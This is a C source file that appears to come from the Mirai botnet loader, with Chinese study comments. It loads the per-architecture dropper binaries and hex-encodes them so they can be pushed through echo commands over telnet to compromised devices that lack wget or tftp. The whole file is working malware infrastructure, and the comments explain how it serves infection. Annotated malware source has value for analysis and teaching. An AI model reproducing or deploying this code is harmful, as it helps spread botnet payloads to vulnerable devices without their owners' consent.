#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <glob.h>
#include "headers/includes.h"
#include "headers/binary.h"

static int bin_list_len = 0;
static struct binary **bin_list = NULL;
//将bins目录下的文件读取到内存中，以~~echo方式~~上传payload文件时用到
//即将编译好的不同体系架构的二进制文件读取到内存中.
//当loader和感染设备建立telnet连接后，如果不得不通过echo命令来上传payload，那么这些数据就会用到了。
//有可能目标没有wget，tftp等命令，那么就使用echo的方式上传payload


//bin_list初始化，读取所有bins/dlr.*文件
BOOL binary_init(void)
{
    glob_t pglob;
    int i;
    //glob 模块可根据Unix 终端所用规则找出所有匹配特定模式的路径名，但会按不确定的顺序返回结果。
    if (glob("bins/dlr.*", GLOB_ERR, NULL, &pglob) != 0)
    {
        printf("Failed to load from bins folder!\n");
        return;
    }

    for (i = 0; i < pglob.gl_pathc; i++)
    {
        char file_name[256];
        struct binary *bin;

        bin_list = realloc(bin_list, (bin_list_len + 1) * sizeof (struct binary *));
        bin_list[bin_list_len] = calloc(1, sizeof (struct binary));
        //bin_list是二维数组，第一维存储了binary指针，第二维存储了binary结构体，即bins【通过第一维binary指针可以索引到】
        bin = bin_list[bin_list_len++];

#ifdef DEBUG
        printf("(%d/%d) %s is loading...\n", i + 1, pglob.gl_pathc, pglob.gl_pathv[i]);
#endif
        strcpy(file_name, pglob.gl_pathv[i]);
        strtok(file_name, "."); //两次调用strtok，第二次调用的时候得到以.分割的一个个部分，直到返回NULL
        //specify NULL as the first argument, which tells the function to continue tokenizing the string you passed in first.
        strcpy(bin->arch, strtok(NULL, ".")); //https://stackoverflow.com/questions/23456374/why-do-we-use-null-in-strtok
        //对于"dir.x86"，第一次返回dir，第二次返回x86【存储到bin->arch中】
        load(bin, pglob.gl_pathv[i]);   //读取pglob.gl_pathv[i]路径指向的文件到bin结构体中
    }

    globfree(&pglob);
    return TRUE;
}
//按照不同体系架构获取相应的二进制文件
struct binary *binary_get_by_arch(char *arch)
{
    int i;

    for (i = 0; i < bin_list_len; i++)
    {
        if (strcmp(arch, bin_list[i]->arch) == 0)
            return bin_list[i]; //返回对应架构的struct *binary。
    }

    return NULL;
}

//将指定的二进制文件读取到内存中
static BOOL load(struct binary *bin, char *fname)
{
    FILE *file;
    char rdbuf[BINARY_BYTES_PER_ECHOLINE];
    int n;

    if ((file = fopen(fname, "r")) == NULL)
    {
        printf("Failed to open %s for parsing\n", fname);
        return FALSE;
    }
    //读取sizeof (char) * 128 = 128个字节
    while ((n = fread(rdbuf, sizeof (char), BINARY_BYTES_PER_ECHOLINE, file)) != 0)
    {
        char *ptr;
        int i;
        //hex_payloads也是二维数组，第一维是char*，指向（128*4）+8字节的空间
        bin->hex_payloads = realloc(bin->hex_payloads, (bin->hex_payloads_len + 1) * sizeof (char *));
        bin->hex_payloads[bin->hex_payloads_len] = calloc(sizeof (char), (4 * n) + 8);  //为什么4*n+8
        ptr = bin->hex_payloads[bin->hex_payloads_len++];

        for (i = 0; i < n; i++) //实际只写入了最多128字节
            ptr += sprintf(ptr, "\\x%02x", (uint8_t)rdbuf[i]);
    }

    return FALSE;
}
